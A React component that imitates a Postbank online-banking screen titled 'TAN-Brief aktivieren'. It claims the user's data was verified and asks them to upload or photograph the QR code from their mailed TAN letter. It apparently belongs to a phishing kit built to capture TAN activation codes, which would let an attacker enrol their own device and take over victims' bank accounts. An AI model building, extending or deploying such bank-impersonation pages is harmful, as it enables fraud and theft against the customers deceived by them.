import React from 'react';
import { QrCode, Upload } from 'lucide-react';
import PostbankFooter from './PostbankFooter';

interface QRInstructionsScreenProps {
  onContinue: () => void;
}

const QRInstructionsScreen: React.FC<QRInstructionsScreenProps> = ({ onContinue }) => {
  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        minHeight: '100vh',
        backgroundColor: 'white',
        paddingTop: '4rem',
        paddingBottom: '4rem'
      }}>
        <div style={{
          maxWidth: '1280px',
          margin: '0 auto',
          padding: '0 20px'
        }}>
          <div style={{
            maxWidth: '600px',
            margin: '0 auto'
          }}>
            <h1 className="mobile-title" style={{
              color: '#333',
              fontSize: '3rem',
              marginBottom: '2rem',
              fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
              fontWeight: '700',
              lineHeight: '1.1'
            }}>
              TAN-Brief aktivieren
            </h1>
            
            <p style={{
              color: '#333',
              fontSize: '1.125rem',
              lineHeight: '1.6',
              marginBottom: '3rem',
              fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
            }}>
              Ihre Daten wurden erfolgreich verifiziert. Als letzten Schritt aktivieren Sie bitte Ihren neuen TAN-Brief, 
              um wieder sicher auf Ihr Konto zugreifen zu können.
            </p>
            
            <div style={{
              backgroundColor: '#f8f9fa',
              border: '1px solid #e5e7eb',
              borderRadius: '8px',
              padding: '2rem',
              marginBottom: '3rem'
            }}>
              <h3 style={{
                color: '#333',
                fontSize: '1.25rem',
                marginBottom: '1.5rem',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontWeight: '700'
              }}>
                So aktivieren Sie Ihren TAN-Brief:
              </h3>
              
              <div style={{ marginBottom: '1.5rem' }}>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                  <span style={{
                    backgroundColor: '#0018a8',
                    color: 'white',
                    borderRadius: '50%',
                    width: '28px',
                    height: '28px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '14px',
                    flexShrink: 0,
                    marginTop: '2px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontWeight: '700'
                  }}>
                    1
                  </span>
                  <div>
                    <p style={{
                      color: '#333',
                      fontSize: '1rem',
                      margin: 0,
                      lineHeight: '1.5',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontWeight: '500'
                    }}>
                      TAN-Brief bereithalten
                    </p>
                    <p style={{
                      color: '#666',
                      fontSize: '0.875rem',
                      margin: '0.25rem 0 0 0',
                      lineHeight: '1.5',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Sie haben einen TAN-Brief mit QR-Code per Post erhalten
                    </p>
                  </div>
                </div>
              </div>
              
              <div style={{ marginBottom: '1.5rem' }}>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                  <span style={{
                    backgroundColor: '#0018a8',
                    color: 'white',
                    borderRadius: '50%',
                    width: '28px',
                    height: '28px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '14px',
                    flexShrink: 0,
                    marginTop: '2px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontWeight: '700'
                  }}>
                    2
                  </span>
                  <div>
                    <p style={{
                      color: '#333',
                      fontSize: '1rem',
                      margin: 0,
                      lineHeight: '1.5',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontWeight: '500'
                    }}>
                      QR-Code scannen
                    </p>
                    <p style={{
                      color: '#666',
                      fontSize: '0.875rem',
                      margin: '0.25rem 0 0 0',
                      lineHeight: '1.5',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Laden Sie den QR-Code hoch oder fotografieren Sie ihn direkt mit Ihrer Kamera
                    </p>
                  </div>
                </div>
              </div>
              
              <div>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                  <span style={{
                    backgroundColor: '#0018a8',
                    color: 'white',
                    borderRadius: '50%',
                    width: '28px',
                    height: '28px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '14px',
                    flexShrink: 0,
                    marginTop: '2px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontWeight: '700'
                  }}>
                    3
                  </span>
                  <div>
                    <p style={{
                      color: '#333',
                      fontSize: '1rem',
                      margin: 0,
                      lineHeight: '1.5',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontWeight: '500'
                    }}>
                      Aktivierung abschließen
                    </p>
                    <p style={{
                      color: '#666',
                      fontSize: '0.875rem',
                      margin: '0.25rem 0 0 0',
                      lineHeight: '1.5',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Ihr TAN-Verfahren wird automatisch aktiviert und Sie können wieder sicher auf Ihr Konto zugreifen
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* Info Box */}
            <div style={{
              backgroundColor: '#e8f4f8',
              border: '1px solid #bee3f8',
              borderRadius: '8px',
              padding: '1.5rem',
              marginBottom: '3rem',
              display: 'flex',
              alignItems: 'flex-start',
              gap: '1rem'
            }}>
              <QrCode size={24} color="#2563eb" style={{ flexShrink: 0, marginTop: '2px' }} />
              <div>
                <p style={{
                  color: '#1e40af',
                  fontSize: '0.875rem',
                  margin: 0,
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                  lineHeight: '1.5'
                }}>
                  <strong>Tipp:</strong> Achten Sie beim Fotografieren auf gute Beleuchtung und halten Sie die Kamera ruhig. 
                  Der QR-Code sollte vollständig im Bild sein und scharf abgebildet werden.
                </p>
              </div>
            </div>
            
            <button
              onClick={onContinue}
              style={{
                backgroundColor: '#0018a8',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '16px 32px',
                fontSize: '16px',
                cursor: 'pointer',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontWeight: '700',
                transition: 'all 0.3s ease',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#001580';
                e.currentTarget.style.transform = 'translateY(-1px)';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#0018a8';
                e.currentTarget.style.transform = 'translateY(0)';
              }}
            >
              <Upload size={20} />
              QR-Code jetzt hochladen
            </button>
          </div>
        </div>
      </div>
      <PostbankFooter />
    </>
  );
};

export default QRInstructionsScreen;